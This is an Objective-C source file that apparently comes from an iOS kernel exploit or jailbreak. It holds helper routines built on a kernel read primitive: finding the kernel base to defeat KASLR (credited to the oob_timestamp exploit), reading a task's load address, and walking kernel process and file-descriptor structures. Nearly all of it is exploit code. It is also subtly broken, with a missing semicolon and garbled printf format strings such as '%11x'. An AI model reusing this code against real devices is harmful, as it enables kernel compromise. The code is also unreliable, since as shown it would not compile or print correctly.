#import "utils.h"
#import "kernel_utils.h"
#import "offsets.h"
#import "time_waste/IOSurface_stuff.h"
extern size_t page_size;


// The method used to find the kernel base is from
// the oob_timestamp exploit by Brandon Azad.
uint64_t FindKernelBase() {
    printf("[+] Finding kernel base..\n")
      uint64_t IOSRUC_port_addr = FindPortAddress(IOSurfaceRootUserClient);
      uint64_t IOSRUC_addr = KernelRead_64bits(IOSRUC_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
      uint64_t kerntxt_addr = KernelRead_64bits(IOSRUC_addr);
      kerntxt_addr |= 0xffffff8000000000;
      printf("[i] kerntxt_addr : 0x%11x \n", kerntxt_addr);
      uint64_t kernel_base = 0;
      uint64_t kernel_page = kerntxt_addr & ~(page_size -1);
     printf("[i] kernel_page : 0x%11x \n", kernel_page);
      for (;; kernel_page -= page_size){
          const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 2, 2};
          uint32_t data[4] = {};
          bool ok = KernelRead(kernel_page, data, sizeof(data));
          data[2] = mach_header[2];
          if(ok && memcmp(data, mach_header, sizeof(mach_header)) == 0){
              kernel_base = kernel_page;
              break;
          }else{
              printf("[-] Keep walking..\n");
          }
      }
    printf("[i] kernel_base : 0x%01611x \n", kernel_base);
    return kernel_base;
}

uint64_t binary_load_address(mach_port_t tp) {
    kern_return_t err;
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;
    memory_object_name_t object_name = MACH_PORT_NULL; /* unused */
    mach_vm_size_t target_first_size = 0x1000;
    mach_vm_address_t target_first_addr = 0x0;
    struct vm_region_basic_info_64 region = {0};
    printf("[+] About to call mach_vm_region\n");
    err = mach_vm_region(tp,
                         &target_first_addr,
                         &target_first_size,
                         VM_REGION_BASIC_INFO_64,
                         (vm_region_info_t)&region,
                         &region_count,
                         &object_name);
    
    if (err != KERN_SUCCESS) {
        printf("[-] Failed to get the region: %s\n", mach_error_string(err));
        return -1;
    }
    printf("[+] Got base address\n");
    
    return target_first_addr;
}

uint64_t dataForFD(int fd, int pid) {
    // proc->p_fd->fd_ofiles[fd]->fproc->fg_data;
    
    uint64_t proc = proc_of_pid(pid);
    uint64_t p_fd = KernelRead_64bits(proc + off_p_fd);
    uint64_t fd_ofiles = KernelRead_64bits(p_fd);
    uint64_t fproc = KernelRead_64bits(fd_ofiles + fd * 8);
    uint64_t f_fglob = KernelRead_64bits(fproc + 8);
    uint64_t fg_data = KernelRead_64bits(f_fglob + 56);
    
    return fg_data;
}
